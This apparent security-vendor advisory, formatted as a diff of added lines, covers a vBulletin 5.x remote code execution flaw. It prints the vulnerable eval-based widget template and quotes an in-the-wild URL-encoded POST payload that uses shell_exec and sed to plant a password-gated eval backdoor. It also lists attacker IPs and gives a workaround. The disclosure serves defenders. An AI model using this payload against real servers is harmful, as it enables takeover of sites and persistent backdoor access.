@@ -1,0 +1,60 @@
+Zero-Day RCE in vBulletin v5.0.0-v5.5.4
+
+A new remote code execution (RCE) zero-day vulnerability has been disclosed by an anonymous researcher on the full disclosure mailing list this past Monday.
+This vulnerability is extremely severe. It allows any website visitors to run PHP code and shell commands on the site’s underlying server.
+Am I At Risk?
+Update: vBulletin has released security patches available here.
+At the time of writing this, this is still a zero-day vulnerability—meaning there are no official patches available to fix this issue.
+As if it wasn’t bad enough, this bug doesn’t require the attacker to have any kind of privilege to conduct a successful attack. vBulletin’s default settings also make the vulnerable endpoint accessible by default.
+According to the original researcher, this issue covers all versions since 5.0.0 (including up to the latest, version 5.5.4). The original release date for version 5 goes back to 2012.
+Sucuri users of our web application firewall are protected from this issue.
+Technical Details
+This bug is caused by vBulletin’s PHP widgets, which are rendered at runtime and used to create dynamic widgets without having to directly access the hosting server.
+The researcher found a way to force the site to render arbitrary widgets using the ajax/render/widget_php route.
+<div class="widget-content">
+<vb:if condition="!empty($widgetConfig['code']) AND
+!$vboptions['disable_php_rendering']">
+{vb:action evaledPHP, bbcode, evalCode, {vb:raw widgetConfig.code}}
+{vb:raw $evaledPHP}
+<vb:else />
+<vb:if condition="$user['can_use_sitebuilder']">
+<span class="note">{vb:phrase click_edit_to_config_module}</span>
+</vb:if>
+</vb:if>
+</div>
+
+Since the evalCode callback does exactly what you think it does, essentially running eval on the code it is fed, this makes it possible to run arbitrary code on the underlying server.
+Attacks In the Wild
+We are seeing a wave of attacks using this exploit in the wild.
+Payload Used
+202.141.232.162 - widgetConfig%5Bcode%5D=echo+shell_exec%28%27sed+-i+%5C%27s%2Feval%28%5C%24code%29%3B%2Fif+%28isset%28%5C%24_REQUEST%5B%5C%22epass%5C%22%5D%29+%5C%26%5C%26+%5C%24_REQUEST%5B%5C%22epass%5C%22%5D+%3D%3D+%5C%222dmfrb28nu3c6s9j%5C%22%29+%7B+eval%28%5C%24code%29%3B+%7D%2Fg%5C%27+includes%2Fvb5%2Ffrontend%2Fcontroller%2Fbbcode.php+%26%26+echo+-n+exploited+%7C+md5sum%27%29%3B+exit%3B [25/Sep/2019:18:01:16 +0000] "POST /index.php?routestring=ajax/render/widget_php HTTP/1.1" 200 5407 "-"
+The payload attackers are using is very interesting: it essentially modifies the vulnerable snippet by adding a password validation.
+This is a way for attackers to maintain access to sites they’ve hacked for themselves, as well as lock out other potential hackers from getting in. From this point, the bad actor can use his newly acquired site to do other malicious things in the future.
+Source IPs Detected So Far
+202.141.232.162
+39.40.24.141
+111.93.249.206
+178.223.189.11
+105.156.84.158
+103.137.192.242
+190.147.179.222
+42.112.159.255
+181.209.96.226
+190.117.233.114
+156.204.11.228
+222.254.76.56
+42.112.159.255
+118.70.26.13
+36.76.172.176
+160.120.177.106
+
+Indicators of Compromise
+Since some of the parameters used in the attacks can be located either on GET or POST requests, your logs may not contain any traces that an attack occurred if the latter was used. Be sure to look for ajax/render/widget_php in your access logs.
+Temporary Solution
+To temporarily resolve this issue, navigate from your administration panel to:
+Admincp >> Options >> General Settings
+From here, enable the Disable PHP, Static HTML, and Ad Module rendering setting.
+Important Note: This may break legitimate uses for this feature.
+Conclusion
+This is a critical vulnerability and should be treated as such. In the event where you cannot enable the Disable PHP, Static HTML, and Ad Module rendering setting within the vBulletin dashboard, you may want to use a firewall to protect your site.
+Sucuri can offer you peace of mind with our web application firewall to patch your website against all known vulnerabilities.
